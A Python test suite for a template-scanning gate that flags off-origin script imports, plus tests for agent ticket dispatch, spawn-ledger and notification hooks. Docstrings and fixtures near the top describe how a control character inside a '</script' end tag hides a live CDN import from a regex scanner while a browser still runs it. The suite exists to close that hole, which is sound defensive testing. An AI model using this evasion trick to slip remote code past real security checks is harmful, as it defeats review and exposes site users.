    signals agreed on every row. Measured NOT to close (script data continues):
        </script\\x0b>  </script\\x1c>  </script\\x1d>  </script\\x1e>  </script\\x1f>
    while `</script >` (real space) DOES close. The gate closes on all five.

    WHY IT MATTERS — measured end to end, not argued. Plant:
        <script type="module">
        // </script\\x0b>
        import x from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";
        </script>
    Chromium's own DOM puts that import INSIDE the <script> element's body (the
    stray VT sits in a JS comment, so the browser's larger body is VALID JS and
    the import RUNS). The gate closes at `</script\\x0b>`, captures only '\\n// ',
    and scan_js_bound reports the tree CLEAN — a live off-origin CDN import
    reaching the product tree on a green gate. Control, same bytes without the
    stray line: the gate FIRES.

    NOT the ruling's accepted edge (`</script foo="a>b">`, which needs
    attribute-grammar parsing). This needs no parser, no dependency and no
    build step — only a precise character class, e.g. `(?=[\\t\\n\\f\\r />])`.

    SHAPE IS DELIBERATE, same discipline as the test above: the body closes with
    a REAL `</script>` and this asserts a POSITIVE (the import IS seen), so `\\Z`
    stays entirely out of play and BUG-0087's `|\\Z` cannot flip it red.

    No browser is needed to RUN this test: chromium is provenance, not a
    dependency. It passes on a machine with none."""
    evil = 'import x from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";'

    control = _js_scan({TPL: '<script type="module">\n%s\n</script>\n' % evil})
    assert control, "fixture broken: the </script> control must fire"

    for ch in ("\x0b", "\x1c", "\x1d", "\x1e", "\x1f"):
        inner = "</script%s>" % ch
        body = '<script type="module">\n// %s\n%s\n</script>\n' % (inner, evil)
        assert ch in body, "fixture broken: the control char never reached the plant"
        found = _js_scan({TPL: body})
        assert found, (
            "an off-origin CDN import placed after %r inside a script body is "
            "reported clean, but chromium does NOT close on %r (U+%04X is not "
            "HTML5 whitespace) — it keeps the body open to the real '</script>' "
            "and RUNS that import. The terminator's lookahead is Python's `\\s`, "
            "which over-matches the HTML5 whitespace set. Same bytes, ordinary "
            "close: %s" % (inner, inner, ord(ch), control))


def test_js_bound_end_tag_closes_on_every_html5_whitespace_char():
    """BUG-0093's other side, and the side nothing pinned. The QA pin above
    guards the terminator's class from going OVER-wide (it catches a re-spelling
    to `\\s`). Nothing guarded it from going UNDER-wide. MEASURED, not assumed: I
    mutated the landed class one character at a time and ran the ticket's whole
    acceptance set — dropping `\\f` and dropping `\\r` EACH left the entire set
    GREEN (exit 0, nothing failed). So ruled characters could be silently deleted
    and no test would notice. This test is what makes them falsifiable.

    (QA re-review, re-measured on tip 2713ebf: `\\f` and `\\r` reproduce as
    survivors, but `\\t` does NOT — dropping `\\t` is caught by the acceptance set
    on its own. The claim above originally named `\\t` too; corrected to what the
    instrument actually reads, since a docstring that overstates its own
    measurement is the same standing lie this suite exists to prevent. The pin's
    value is unchanged: `\\f` and `\\r` were genuinely unguarded.)

    `\\r` is the one that most needed pinning. It was the one limb of the class
    that was originally ARGUED from the spec (HTML5 input-stream preprocessing
    normalizes CR to LF) rather than measured; the architect then MEASURED it and
    the argument held. A character whose membership rests on a measurement nobody
    can re-run from the suite is exactly the character a later edit drops.

    ORACLE (BUG-0093 ruling, chrome-headless-shell, playwright chromium-1223,
    DEP-0006; instrument self-checked to discriminate — control `</script>`
    EXECUTED/element, control `</p>` neither):
        </script SP>  </script TAB>  </script LF>  </script FF>   -> EXECUTED
        </script CR>  </script CRLF>                             -> EXECUTED
        </script VT>  </script 1c-1f>                            -> NOT executed
    A browser CLOSES on each of the five; the gate must close there too, or it
    swallows the trailing markup as if it were code.

    CR IS NOT REACHABLE THROUGH THE FILE PATH, AND I FOUND THAT BY MEASURING
    RATHER THAN BY ASSUMING MY OWN TEST WORKED. My first version of this test
    asserted CR through `_js_scan` and PASSED — and still passed with `\\r`
    deleted from the class. The reason: scan_js_bound reads templates in TEXT
    mode with the default `newline=None` (self_scan.py:326), i.e. UNIVERSAL
    NEWLINES, so a CR byte on disk is translated to LF before SCRIPT_BLOCK_RE
    ever sees it. Measured:
        bytes on disk        b'</script\\r>'
        what self_scan sees   '</script\\n>'
    So a CR assert routed through a file is a TAUTOLOGY: it passes on `\\n`. That
    is why the class is pinned DIRECTLY on the expression below as well.

    (No bug hides here: python's universal-newline read maps CR->LF exactly as
    HTML5's input-stream preprocessing does, so the gate and the browser agree on
    CR through the file path by convergence. `\\r` in the class is therefore
    defensive — SCRIPT_BLOCK_RE is a module constant and nothing guarantees every
    future caller feeds it universal-newline-decoded text. It is ruled, it is
    correct against the browser, and it stays; this test just pins it where it is
    actually observable.)

    SHAPE, and the silence here is guarded at BOTH ends. Closing correctly is a
    NEGATIVE (the trailing `<a href>` is markup and must not be read as code), and
    a silence can be green for the wrong reason — so this fixture is self-checked
    to DISCRIMINATE, exactly as the browser instrument was:
      * `control_body` — the same link INSIDE a script body — must FIRE, proving
        the fixture can see this URL at all.
      * `\\x0b` (VT) in the SAME plant must FIRE, proving the fixture actually
        detects a failure-to-close. Under the fix VT does not close, so the span
        runs on and swallows the link.
      * the reachable HTML5 chars must be SILENT.
    The spectrum therefore disagrees at both ends within one fixture; a broken
    plant cannot produce the pattern. A trailing real `</script>` gives any
    runaway span a terminator, so `\\Z` stays out of play and BUG-0087 (were it
    ever revived) could not flip this red.

    MUTATION-VERIFIED, since a pin that kills nothing is decoration. Each of
    these, applied to the landed class, turns this test RED: drop `\\t`, drop
    `\\n`, drop `\\f`, drop `\\r`, drop the space, drop `/`, drop `>`, re-widen
    to `\\s`, drop the lookahead entirely, and the range `[\\t-\\r />]` (which
    quietly re-admits VT) — all re-confirmed by QA on tip 2713ebf against a
    control that stays green.

    Also killed, but ONLY after QA widened the probe window below: the unicode
    over-wide mutants `[... \\x85\\xa0]` and `[... \\u3000]`. At the original
    range(0x80) they SURVIVED this pin AND the whole acceptance set.

    No browser is needed to RUN this test: chromium is provenance, not a
    dependency. It passes on a machine with none."""
    # THE CLASS ITSELF, pinned where CR is observable at all. `[\t\n\f\r />]`
    # could also be silently mis-edited into a RANGE (e.g. `[\t-\r />]`, which
    # would re-admit VT); reading the accepting set back off the compiled object
    # catches that too.
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import self_scan

    # WINDOW (QA, re-review): this probe ran over range(0x80) and could not see
    # the top half of the very defect BUG-0093 is about. `\s` is a superset of
    # the HTML5 set by 24 characters, and MOST OF THEM ARE ABOVE 0x7F — measured
    # off the old expression: 0x0b, 0x1c-0x1f, 0x85 (NEL), 0xa0 (NBSP), 0x1680,
    # 0x2000-0x200a, 0x2028, 0x2029, 0x202f, 0x205f, 0x3000. The ticket named the
    # five ASCII ones; the class was always wider than that.
    # MUTATION-MEASURED, which is why this is widened and not just tidied: the
    # mutant `[\t\n\f\r />\x85\xa0 ]` — a plausible future "handle unicode
    # whitespace too" edit, i.e. THIS BUG'S EXACT FAMILY — SURVIVED the whole
    # acceptance set AND this pin at range(0x80). It dies at range(0x3001).
    # 0x3001 is not arbitrary: U+3000 is the highest codepoint python's `\s`
    # matches (29 in total, verified over the full unicode range), so this window
    # provably contains every character the old spelling could re-admit. Costs
    # 0.01s.
    probe = range(0x3001)
    ws_superset = {c for c in probe if re.match(r"\s", chr(c))}
    assert len(ws_superset) == 29, (
        "window self-check: python's `\\s` should match 29 codepoints at or below "
        "U+3000 — got %d. If python's whitespace set changed, this window may no "
        "longer cover the over-wide risk surface." % len(ws_superset))

    html5 = {0x09, 0x0A, 0x0C, 0x0D, 0x20, 0x2F, 0x3E}
    closes = {i for i in probe
              if self_scan.SCRIPT_BLOCK_RE.search("<script>B</script%s>" % chr(i))}
    assert closes == html5, (
        "SCRIPT_BLOCK_RE's terminator must close on EXACTLY the HTML5 "
        "script-data-end-tag-name set — tab/LF/FF/CR/space, `/`, `>` — and "
        "nothing else. chromium was measured on every one (BUG-0093). "
        "Unexpectedly closes on: %s. Fails to close on: %s"
        % (sorted(hex(c) for c in closes - html5),
           sorted(hex(c) for c in html5 - closes)))

    link = '<a href="https://example.com/help">help</a>'

    def plant(sep):
        # Correct close -> two spans ('var s = 1;', 'var t = 2;') and the link is
        # markup BETWEEN them, never scanned. Under-wide -> the first span runs
        # past the end tag to the trailing real </script> and swallows the link.
        return {TPL: '<script type="module">var s = 1;</script%s>\n%s\n'
                     '<script type="module">var t = 2;</script>\n' % (sep, link)}

    control_body = _js_scan(
        {TPL: '<script type="module">var s = "%s";</script>\n' % link})
    assert control_body, "fixture broken: the link must fire when it IS code"

    vt = _js_scan(plant("\x0b"))
    assert vt and "example.com" in vt[0], (
        "fixture broken: it cannot detect a failure-to-close. VT is not HTML5 "
        "whitespace, so the span must run past `</script\\x0b>` and swallow the "
        "link — if this is silent the plant proves nothing about the five "
        "chars below: %s" % vt)

    # CR is deliberately absent: the universal-newline read turns it into LF
    # before the gate sees it (see the docstring), so a CR row here would assert
    # nothing. It is pinned on the expression above instead.
    for name, sep in (("space", " "), ("tab", "\t"), ("LF", "\n"), ("FF", "\f")):
        assert sep in plant(sep)[TPL], "fixture broken: %s never reached the plant" % name
        found = _js_scan(plant(sep))
        assert not found, (
            "the terminator did NOT close on %s (%r), so the span ran past the "
            "end tag and swallowed the trailing markup link as if it were code. "
            "chromium DOES close on %s — every one of tab/LF/FF/CR/space ends "
            "the script-data-end-tag-name state. The ruled class "
            "`(?=[\\t\\n\\f\\r />])` has been narrowed and is now under-wide: %s"
            % (name, sep, name, found))


# WITHDRAWN (BUG-0096): the QA pin filed as BUG-0087 (obsolete) asserted that
# the gate must FIRE on an unclosed trailing inline <script> body at EOF, on the
# claim that a real browser EXECUTES those bytes. THE CLAIM IS MEASURED FALSE
# and the pin is deleted rather than weakened or xfailed.
#
# The pin's oracle grepped `--dump-dom` output for the payload's SOURCE TEXT.
# That measures the SERIALIZER, not the ENGINE: chromium's serializer prints an
# UN-EXECUTED script's body and SYNTHESIZES the `</script>` the file never had,
# so the dump contains the payload while nothing ran. Re-running the pin's own
# plant with a READBACK instead of a grep settles it — `<title>` stays NOT_RUN.
# An oracle is a binary PLUS A READBACK; exit 0 proves chrome RAN, not that
# anything was measured.
#
# The two tests below replace it with what IS measured. See DECISIONS 2026-07-17.


def test_js_bound_flags_an_unclosed_trailing_remote_script_src_qa():
    """The protection that ACTUALLY EXISTS, and that nothing else proves.

    scan_js_bound runs REMOTE_SRC_RE over the RAW file text, INDEPENDENT of
    `_code_spans` (self_scan.py: the `for m in REMOTE_SRC_RE.finditer(text)`
    loop sits OUTSIDE the `for offset, code in _code_spans(rel, text)` loop).
    That independence is the whole defence here: an unclosed
    `<script src="https://cdn…">` at EOF opens NO span — SCRIPT_BLOCK_RE needs a
    close tag — so a refactor that folded REMOTE_SRC_RE into the span loop as a
    tidy-up would silently stop flagging it, and every other js_bound test would
    stay green. This is that regression's only tripwire.

    This is the real harm case BUG-0067 described: a truncated template whose
    last line is a live CDN tag. Unlike an unclosed inline BODY (inert — see
    test_js_bound_stays_silent_on_an_inert_unclosed_trailing_script_body), an
    unclosed `src=` tag DOES load and run: the browser closes the element
    implicitly at EOF and the fetch is driven by the ATTRIBUTE, not by the body
    ever being parsed as script data."""
    evil = '<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1/x.js">'

    control = _js_scan({TPL: "%s</script>\n" % evil})
    assert control, "fixture broken: the closed-tag control must fire"

    found = _js_scan({TPL: evil})
    assert found, (
        "an off-origin CDN src in an UNCLOSED trailing <script> at EOF is "
        "reported clean. REMOTE_SRC_RE must scan the RAW text, not only "
        "_code_spans: an unclosed tag opens no span, and this tag LOADS. The "
        "same bytes closed by '</script>' fire: %s" % (control,))
    assert "remote-script-src" in found[0], found


def test_js_bound_stays_silent_on_an_inert_unclosed_trailing_script_body():
    """The gate is SILENT on an unclosed trailing inline BODY at EOF, and that
    silence is CORRECT: the browser does not execute those bytes. Pinning
    silence is normally suspect — BUG-0086's builder rightly refused to pin this
    while it was UNMEASURED. It is measured now, so the DECISIONS bar ('when you
    cannot measure a claim, the honest artifact is a FLAG, never a pin') is met.

    PROVENANCE (this suite depends on NO browser — chromium is cited here, never
    invoked; the artifact runs with subprocess spawns poisoned):
      binary  : chrome-headless-shell, playwright chromium-1223 (DEP-0006)
      signal  : SYNCHRONOUS XHR recorded in a local http.server's OWN request
                log. Serializer-free by construction — an un-executed script
                cannot make a network request. NOT a --dump-dom grep, which is
                what manufactured the withdrawn pin (see BUG-0087, obsolete).
      markers : ASSEMBLED AT RUNTIME from fragments, so the marker string does
                not exist in the served bytes and cannot be found by grepping
                the plant.
      controls: a closed classic <script> AND a closed module both EXECUTED
                under the IDENTICAL invocation on every row — so an INERT row is
                the engine's verdict, not a dead harness or a race.
      result  : INERT on all of — unclosed classic, unclosed module, unclosed +
                trailing newline, unclosed + partial '</script', unclosed +
                trailing markup. On file:// and http://.

    So the terminator must NOT grow `|\\Z`. `\\Z` closes nothing a browser
    closes; it would make the gate FIRE ON INERT BYTES — false fires in service
    of a hole that does not exist, i.e. a suite defending a fiction. A gate that
    cries wolf on dead bytes is how a gate gets ignored.

    This pin exists so BUG-0087 is not re-filed an eighth time: if you are here
    because you think this body executes, MEASURE IT WITH A READBACK first."""
    evil = 'import x from "https://cdn.jsdelivr.net/npm/canvas-confetti@1/+esm";'

    control = _js_scan({TPL: '<script type="module">%s</script>\n' % evil})
    assert control, "fixture broken: the </script> control must fire"

    for name, plant in (
            ("unclosed module", '<script type="module">%s' % evil),
            ("unclosed classic", "<script>%s" % evil),
            ("unclosed + partial end tag", "<script>%s</script" % evil),
    ):
        found = _js_scan({TPL: plant})
        assert not found, (
            "the gate FIRED on an inert unclosed trailing script body (%s). "
            "chrome-headless-shell does NOT execute those bytes (measured: "
            "sync-XHR beacon in a server request log, must-execute controls "
            "green under the identical invocation), so this is a FALSE FIRE on "
            "dead bytes — most likely a `|\\\\Z` added to the terminator: %s"
            % (name, found))


def test_js_bound_follows_a_symlinked_dir_under_the_served_static_tree_qa():
    """BUG (QA, post-BUG-0068): BUG-0068 anchored SKIP_DIRS to the top of the
    scope entry, so a blob at static/node_modules/ is caught. But
    product_assets() walks with os.walk's default followlinks=False, so a
    symlinked DIRECTORY under quizapp/static/ is never descended into — while
    Flask serves straight through it (verified: GET
    /static/vendor/canvas-confetti/dist/confetti.min.js -> 200, 919 bytes).

    This is not hypothetical plumbing. STACK forbids a bundler, so the only
    no-build way to serve an npm package is to put node_modules somewhere and
    point the static tree at it — and `app/node_modules` is itself SKIP_DIRS-
    exempt at the root. The two halves compose into a hole: the blob lives in
    the exempt vendored root, is published to browsers via the symlink, and
    the gate reports 'JS bound clean'. The symlink commits as a normal git
    entry (mode 120000, body '../../node_modules'), so it survives a clone.

    A symlinked FILE is already caught (os.walk lists it among filenames); it
    is the directory case that leaks. Same invariant as BUG-0068 — nothing we
    publish is exempt because of how its path is spelled — different
    mechanism, so it needs its own pin."""
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import self_scan
    blob = "!function(e){" + "z" * 900 + "}(w);\n"
    with tempfile.TemporaryDirectory() as td:
        vendored = os.path.join(td, "app", "node_modules",
                                "canvas-confetti", "dist")
        os.makedirs(vendored)
        with open(os.path.join(vendored, "confetti.min.js"), "w") as f:
            f.write(blob)
        static = os.path.join(td, "app", "quizapp", "static")
        os.makedirs(static)
        # exactly what a builder reaching for a JS lib writes, and exactly
        # what `git add` stores: a relative in-repo symlink.
        os.symlink("../../node_modules", os.path.join(static, "vendor"))
        assert os.path.exists(os.path.join(
            static, "vendor", "canvas-confetti", "dist", "confetti.min.js")), \
            "fixture broken: the symlink does not resolve"
        orig = self_scan.lib.default_scope
        self_scan.lib.default_scope = lambda: ["app"]
        try:
            found = self_scan.scan_js_bound(td)
        finally:
            self_scan.lib.default_scope = orig
    assert found, ("a minified blob published at "
                   "/static/vendor/canvas-confetti/dist/confetti.min.js "
                   "through a symlinked dir is reported clean")


_CYCLE_PROBE = r'''
import os, sys, tempfile
sys.path.insert(0, %r)
import self_scan
self_scan.lib.default_scope = lambda: ["app"]   # fixture scope, any install
blob = "!function(e){" + "z" * 900 + "}(w);\n"
shape = sys.argv[1]
with tempfile.TemporaryDirectory() as td:
    static = os.path.join(td, "app", "quizapp", "static")
    os.makedirs(static)
    # The blob MUST live INSIDE the aliased tree, or the lap count cannot
    # reach the assertion: a blob outside the cycle is found exactly once by
    # a naive walk too, and the probe would pass against the very mutant it
    # names (QA measured: with the blob at static/, naive followlinks=True
    # returns 1 for the a->b->a shape — a vacuous pin. With it inside `a`,
    # naive returns 32, the fix returns 1).
    if shape == "self":
        # `loop` aliases static itself, so static/ IS the cycle's tree.
        home = static
        os.symlink(".", os.path.join(static, "loop"))
    else:
        a, b = os.path.join(static, "a"), os.path.join(static, "b")
        os.makedirs(a)
        os.makedirs(b)
        os.symlink(os.path.join("..", "b"), os.path.join(a, "tob"))
        os.symlink(os.path.join("..", "a"), os.path.join(b, "toa"))
        home = a
    with open(os.path.join(home, "vendor.min.js"), "w") as f:
        f.write(blob)
    print(len(self_scan.scan_js_bound(td)))
'''


def test_js_bound_symlink_walk_terminates_on_a_cycle():
    """BUG-0077's fix follows symlinked dirs, which is exactly what
    os.walk's followlinks=False was protecting against: `ln -s . loop` (and
    a -> b -> a) walk their own alias forever. product_assets() must admit
    each directory at most once by resolved identity, so a cycle's second lap
    is pruned.

    This runs in a SUBPROCESS with a timeout on purpose: an in-process
    assertion cannot fail a walk that never returns — it hangs the suite, and
    a hang reads as infrastructure flake rather than as this regression.

    (Measured on the naive followlinks=True: a self-loop does not spin
    literally forever on macOS/Linux — the kernel raises ELOOP after ~32
    symlink resolutions and os.walk's default onerror SWALLOWS it, so the walk
    quietly stops at 33 laps having re-scanned the aliased tree 32 times. That
    is an accident of the OS's resolution limit, not a bound this gate chose,
    and it is silent. The visited-realpath set is the bound we chose: one lap,
    and one finding rather than 32 copies of it.)"""
    probe = _CYCLE_PROBE % os.path.dirname(os.path.abspath(__file__))
    for shape in ("self", "ab"):
        try:
            r = subprocess.run([sys.executable, "-c", probe, shape],
                               capture_output=True, text=True, timeout=60)
        except subprocess.TimeoutExpired:
            assert False, ("product_assets() does not terminate on a %s "
                           "symlink cycle: the walk follows its own alias "
                           "without tracking visited realpaths" % shape)
        assert r.returncode == 0, r.stdout + r.stderr
        # exactly one: the blob is reported once, not once per lap of the cycle
        assert r.stdout.strip() == "1", (
            "%s cycle: expected the blob reported exactly once, got %r"
            % (shape, r.stdout.strip()))


def test_js_bound_still_ignores_the_vendored_root_after_symlinks_are_followed():
    """The other direction of BUG-0077, and the one that matters more if it
    breaks: following symlinks must NOT drag app/.venv or a root-level
    node_modules into scope. Those ship other people's minified JS by the
    thousand; if they fired, every handoff would red and the gate would be
    switched off within a day — worse than the leak it was fixed for. The
    root-anchored SKIP_DIRS (BUG-0068) still governs the vendored roots
    themselves; only a path PUBLISHED through the static tree loses the
    exemption."""
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import self_scan
    blob = "var a=1;" + "x" * 900 + "\n"
    with tempfile.TemporaryDirectory() as td:
        venv = os.path.join(td, "app", ".venv", "lib", "werkzeug", "debug")
        os.makedirs(venv)
        with open(os.path.join(venv, "debugger.min.js"), "w") as f:
            f.write(blob)
        nm = os.path.join(td, "app", "node_modules", "pkg", "dist")
        os.makedirs(nm)
        with open(os.path.join(nm, "bundle.js"), "w") as f:
            f.write(blob)
        # a symlink INSIDE the vendored root (npm writes these for real: .bin
        # entries, and hoisted deps link across packages). Following links
        # must not turn the exempt root into findings.
        os.symlink(os.path.join("..", "..", "pkg"), os.path.join(
            td, "app", "node_modules", "alias"))
        static = os.path.join(td, "app", "quizapp", "static")
        os.makedirs(static)
        with open(os.path.join(static, "enhance.js"), "w") as f:
            f.write("document.querySelector('form');\n")
        orig = self_scan.lib.default_scope
        self_scan.lib.default_scope = lambda: ["app"]
        try:
            assert self_scan.scan_js_bound(td) == [], \
                "the vendored roots fired: every handoff would red"
        finally:
            self_scan.lib.default_scope = orig


def test_qa_batches_group_by_parent():
    # dev cadence (2026-07-20): siblings under one FEAT share one QA spawn
    # (one integrated attack, per-ticket closes); parentless tickets pool
    # into one batch per tick. Grouping is structural — no config key.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        for t in ("fA", "fB"):
            _run(af, "ticket.py", "new", "--type", "FEAT", "--title", t,
                 "--as", "strategist", "--milestone", "M1")
        specs = [("a1", "FEAT-0001"), ("a2", "FEAT-0001"),
                 ("b1", "FEAT-0002"), ("solo", None)]
        for name, parent in specs:
            args = ["ticket.py", "new", "--type", "TASK", "--title", name,
                    "--as", "architect", "--scope", "app",
                    "--criteria", "`test -f app/main.py` exits 0"]
            if parent:
                args += ["--parent", parent]
            _run(af, *args)
        plan = json.loads(_run(af, "dispatch.py"))
        tids = ["TASK-%04d" % i for i in range(1, 5)]
        assert plan["assign_to_builders"] == tids, plan["assign_to_builders"]
        wts = {t: os.path.join(tmp, plan["worktrees"][t]) for t in tids}
        for n, tid in enumerate(tids, 1):
            _run(af, "ticket.py", "claim", tid, "--as", "builder-1")
            with open(os.path.join(wts[tid], "app", "f%d.py" % n), "w") as f:
                f.write("x = %d\n" % n)
            for a in (["add", "-A"], ["commit", "-q", "-m", tid]):
                subprocess.run(["git", "-C", wts[tid]] + a, check=True,
                               capture_output=True)
            _run(af, "ticket.py", "transition", tid, "built",
                 "--as", "builder-1", "--note", "handoff")
        plan = json.loads(_run(af, "dispatch.py"))
        assert plan["qa_batches"] == [
            ["TASK-0004"], ["TASK-0001", "TASK-0002"], ["TASK-0003"]], \
            plan["qa_batches"]


def test_early_walk_flag():
    # dev cadence (2026-07-20): the first FEAT of a milestone closing while
    # the milestone still has open work fires early_walk_due ONCE; the
    # orchestrator's "early_walk:" line in the milestone file is the dedupe.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _run(af, "ticket.py", "new", "--type", "FEAT", "--title", "f",
             "--as", "strategist", "--milestone", "M1")
        _run(af, "ticket.py", "new", "--type", "TASK", "--title", "t",
             "--as", "architect", "--milestone", "M1", "--scope", "app",
             "--criteria", "`test -f app/main.py` exits 0")
        ms_dir = os.path.join(af, "tracker", "milestones")
        os.makedirs(ms_dir)
        mp = os.path.join(ms_dir, "M1.md")
        with open(mp, "w") as f:
            f.write("# M1\n")
        fired = lambda plan: [f["milestone"] for f in plan["flags"]
                              if f["kind"] == "early_walk_due"]
        assert fired(json.loads(_run(af, "dispatch.py"))) == []  # FEAT open
        fp = os.path.join(af, "tracker", "tickets", "FEAT-0001.md")
        with open(fp) as f:
            text = f.read()
        with open(fp, "w") as f:
            f.write(text.replace("status: open", "status: done", 1))
        assert fired(json.loads(_run(af, "dispatch.py"))) == ["M1"]
        with open(mp, "a") as f:
            f.write("early_walk: 2026-07-20 fired\n")
        assert fired(json.loads(_run(af, "dispatch.py"))) == []  # deduped


# --- agent_ledger + ship_marker hooks (spawn-ledger telemetry) -----------------
# Seeded 2026-07-21: four straight runs of zero-token return lines. Subagents
# launch in the background, so PostToolUse fired at launch with an ack carrying
# no usage; the fix pairs PreToolUse 'spawned' lines with SubagentStop return
# lines read from the agent's own transcript.

LEDGER = os.path.join(lib.PRODUCT, ".claude", "hooks", "agent_ledger.py")
SHIP_MARKER = os.path.join(lib.PRODUCT, ".claude", "hooks", "ship_marker.py")


def _hook(script, payload, project):
    env = dict(os.environ, CLAUDE_PROJECT_DIR=project)
    return subprocess.run([sys.executable, script], input=json.dumps(payload),
                          capture_output=True, text=True, env=env)


def _ledger_tracker(proj):
    tracker = os.path.join(proj, "agenticflow", "tracker")
    os.makedirs(tracker)
    return tracker


def test_ledger_spawn_then_subagent_stop():
    with tempfile.TemporaryDirectory() as td:
        proj = os.path.realpath(td)
        tracker = _ledger_tracker(proj)
        tr = os.path.join(proj, "agent-x.jsonl")
        with open(tr, "w") as f:
            for e in [
                {"type": "user", "timestamp": "2026-07-21T10:00:00.000Z",
                 "message": {"content": "work packet for TASK-0042"}},
                {"type": "assistant", "timestamp": "2026-07-21T10:01:00.000Z",
                 "message": {"usage": {"output_tokens": 1200}}},
                {"type": "assistant", "timestamp": "2026-07-21T10:02:30.000Z",
                 "message": {"usage": {"output_tokens": 300, "input_tokens": 100,
                                       "cache_read_input_tokens": 40000},
                             "content": [{"type": "text", "text": "done"}]}},
            ]:
                f.write(json.dumps(e) + "\n")
        spawn = {"hook_event_name": "PreToolUse",
                 "tool_input": {"subagent_type": "builder",
                                "description": "builder-1 implements TASK-0042",
                                "prompt": "packet body"}}
        stop = {"hook_event_name": "SubagentStop", "agent_type": "builder",
                "agent_transcript_path": tr}
        log = os.path.join(tracker, "spawn_log.tsv")
        _hook(LEDGER, spawn, proj)  # no RUNNING file -> not our business
        assert not os.path.exists(log)
        open(os.path.join(tracker, "RUNNING"), "w").close()
        _hook(LEDGER, spawn, proj)
        _hook(LEDGER, stop, proj)
        rows = [ln.rstrip("\n").split("\t") for ln in open(log)]
        assert rows[0][1:] == ["builder", "TASK-0042", "spawned"], rows
        # tokens summed over assistant turns; seconds = transcript span
        # ... plus the context size at the last turn (input + cache tokens):
        # dispatch.py's resume_cap decides from it whether a SendMessage
        # resume is still cheaper than a cold start
        assert rows[1][1:] == ["builder", "TASK-0042", "1500", "150", "40100"], rows


def test_ledger_ignores_background_launch_ack():
    with tempfile.TemporaryDirectory() as td:
        proj = os.path.realpath(td)
        tracker = _ledger_tracker(proj)
        open(os.path.join(tracker, "RUNNING"), "w").close()
        ack = {"hook_event_name": "PostToolUse",
               "tool_input": {"subagent_type": "builder",
                              "description": "builder-1 implements TASK-0042"},
               "tool_response": {"status": "async_launched", "agentId": "x"}}
        _hook(LEDGER, ack, proj)
        assert not os.path.exists(os.path.join(tracker, "spawn_log.tsv"))


def test_ledger_stop_adopts_ticket_from_spawned_line():
    # The ticket ID often rides only the Agent call's description, which never
    # reaches the subagent transcript — the return line adopts it from the
    # oldest unmatched spawned line of the same role.
    with tempfile.TemporaryDirectory() as td:
        proj = os.path.realpath(td)
        tracker = _ledger_tracker(proj)
        open(os.path.join(tracker, "RUNNING"), "w").close()
        tr = os.path.join(proj, "agent-y.jsonl")
        with open(tr, "w") as f:
            f.write(json.dumps({"type": "user",
                                "timestamp": "2026-07-21T11:00:00.000Z",
                                "message": {"content": "attack the app"}}) + "\n")
            f.write(json.dumps({"type": "assistant",
                                "timestamp": "2026-07-21T11:00:40.000Z",
                                "message": {"usage": {"output_tokens": 77}}}) + "\n")
        spawn = {"hook_event_name": "PreToolUse",
                 "tool_input": {"subagent_type": "qa-adversary",
                                "description": "qa attacks BUG-0007",
                                "prompt": "no id in body"}}
        stop = {"hook_event_name": "SubagentStop", "agent_type": "qa-adversary",
                "agent_transcript_path": tr}
        _hook(LEDGER, spawn, proj)
        _hook(LEDGER, stop, proj)
        rows = [ln.rstrip("\n").split("\t")
                for ln in open(os.path.join(tracker, "spawn_log.tsv"))]
        assert rows[1][1:] == ["qa-adversary", "BUG-0007", "77", "40", "-"], rows


def test_ship_marker_writes_run_boundary():
    with tempfile.TemporaryDirectory() as td:
        proj = os.path.realpath(td)
        tracker = _ledger_tracker(proj)
        log = os.path.join(tracker, "spawn_log.tsv")
        _hook(SHIP_MARKER, {"prompt": "hello there", "session_id": "s-1"}, proj)
        assert not os.path.exists(log)  # non-/ship prompts leave no boundary
        _hook(SHIP_MARKER, {"prompt": "/ship resume", "session_id": "s-1"}, proj)
        with open(log) as f:
            line = f.read().splitlines()[-1]
        assert line.startswith("# run\t") and line.endswith("\ts-1"), line


# --- notify seam (events.jsonl + notify_command + Stop hook) -------------------

NOTIFY_STOP = os.path.join(lib.PRODUCT, ".claude", "hooks", "notify_stop.py")


def test_notify_appends_event_and_pipes_command():
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        with open(os.path.join(af, "run.yaml"), "w") as f:
            f.write("notify_command: cat > notified.json\n")
        _run(af, "notify.py", "gate_question", "--title", "M2 gate",
             "--body", "ship it?")
        ev = json.loads(open(os.path.join(af, "tracker", "events.jsonl")).read())
        assert (ev["kind"], ev["title"], ev["body"]) == \
            ("gate_question", "M2 gate", "ship it?"), ev
        piped = json.loads(open(os.path.join(tmp, "notified.json")).read())
        assert piped == ev, piped


def test_notify_hook_pushes_only_hard_blocks():
    # Ben's ruling (2026-08-13, kspace: 27 pushes in 19h, ~16 narration or
    # non-blocking): a push means "the run cannot proceed without you."
    # Turn-ends and idle waits never push; permission prompts and
    # AskUserQuestion do, because they block by construction.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        tracker = os.path.join(af, "tracker")
        with open(os.path.join(tracker, "ORCHESTRATOR_SESSION"), "w") as f:
            f.write("sess-orch\n")
        tr = os.path.join(tmp, "session.jsonl")
        with open(tr, "w") as f:
            f.write(json.dumps({"type": "assistant", "message": {
                "content": [{"type": "text",
                             "text": "Gate: merge M2 or revise?"}]}}) + "\n")
        events = os.path.join(tracker, "events.jsonl")
        # a turn-end is narration timing, not need — even mid-run, even
        # with a question in the text (explicit channels carry the asks)
        _hook(NOTIFY_STOP, {"hook_event_name": "Stop",
                            "session_id": "sess-orch",
                            "transcript_path": tr}, tmp)
        assert not os.path.exists(events)
        # an idle wait is the same turn-end sixty seconds later
        _hook(NOTIFY_STOP, {"hook_event_name": "Notification",
                            "session_id": "sess-orch",
                            "message": "Claude is waiting for your input"}, tmp)
        assert not os.path.exists(events)
        # a permission prompt blocks the whole run — it pushes
        _hook(NOTIFY_STOP, {"hook_event_name": "Notification",
                            "session_id": "sess-orch",
                            "message": "Claude needs your permission to use "
                                       "Bash"}, tmp)
        ev = json.loads(open(events).read())
        assert ev["kind"] == "attention", ev
